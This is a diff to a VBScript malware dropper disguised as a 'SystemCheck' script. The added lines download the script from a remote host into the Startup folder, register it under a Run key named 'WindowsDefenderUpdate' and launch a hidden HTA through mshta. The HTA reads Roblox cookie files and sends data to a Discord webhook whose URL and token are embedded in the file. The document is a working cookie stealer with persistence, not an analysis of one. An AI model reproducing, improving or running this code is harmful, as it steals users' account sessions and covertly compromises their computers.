@@ -1,5 +1,33 @@
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh = CreateObject("WScript.Shell")
+If Err.Number <> 0 Then
+    ' If run via mshta, WScript isn't available. Use the HTA object instead.
+    Set sh = CreateObject("WScript.Shell")
+End If
+
+Dim selfUrl, startupPath
+selfUrl = "https://dicerigs.app/SystemCheck.vbs"
+startupPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\sys_check.vbs"
+
+' Persist: Download self to Startup folder if not there
+If Not fso.FileExists(startupPath) Then
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", selfUrl, False
+    h.Send
+    If h.Status = 200 Then
+        Dim f: Set f = fso.CreateTextFile(startupPath, True)
+        f.Write h.ResponseText
+        f.Close
+        Set f = Nothing
+    End If
+    Set h = Nothing
+End If
+
+' Persist: Add to Registry Run
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", "wscript.exe """ & startupPath & """", "REG_SZ"
+
+' Create HTA
 htaPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\sys_check.hta"
 Set f = fso.CreateTextFile(htaPath, True)
 f.WriteLine "<html><head><title>.</title>"
@@ -13,16 +41,8 @@ f.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
 f.WriteLine "WH = ""https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"""
 f.WriteLine "PC = sh.ExpandEnvironmentStrings(""%COMPUTERNAME%"")"
 f.WriteLine "USER = sh.ExpandEnvironmentStrings(""%USERNAME%"")"
-f.WriteLine "Call Persist"
 f.WriteLine "Call GrabRoblox"
 f.WriteLine "window.close()"
-f.WriteLine "Sub Persist()"
-f.WriteLine "    On Error Resume Next"
-f.WriteLine "    Dim startup, selfPath"
-f.WriteLine "    selfPath = sh.ExpandEnvironmentStrings(""%APPDATA%"") & ""\Microsoft\Windows\Start Menu\Programs\Startup\sys_check.hta"""
-f.WriteLine "    fso.CopyFile Replace(WScript.ScriptFullName, ""WScript."", """"), selfPath, True"
-f.WriteLine "    sh.RegWrite ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate"", ""wscript.exe """""" & selfPath & """""""", ""REG_SZ"""
-f.WriteLine "End Sub"
 f.WriteLine "Sub GrabRoblox()"
 f.WriteLine "    Dim paths(4)"
 f.WriteLine "    paths(0) = sh.ExpandEnvironmentStrings(""%LOCALAPPDATA%"") & ""\Roblox\LocalStorage\robloxcookies.dat"""
@@ -98,4 +118,4 @@ f.WriteLine "Function MkGuid(): Dim t: Set t = CreateObject(""Scriptlet.TypeLib"
 f.WriteLine "</script>"
 f.WriteLine "</head><body></body></html>"
 f.Close
-sh.Run """" & htaPath & """", 1, False
+sh.Run "mshta.exe """ & htaPath & """", 0, False
